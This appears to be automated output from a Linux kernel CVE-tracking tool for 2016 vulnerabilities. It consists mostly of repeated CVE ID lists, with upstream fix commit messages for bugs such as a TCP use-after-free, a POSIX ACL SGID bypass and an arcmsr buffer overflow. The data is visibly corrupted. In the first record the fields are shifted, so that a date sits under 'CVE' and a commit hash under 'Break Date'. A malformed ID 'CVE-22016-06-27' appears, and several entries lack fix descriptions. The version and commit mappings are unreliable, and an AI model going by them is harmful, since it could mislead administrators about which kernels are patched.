CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
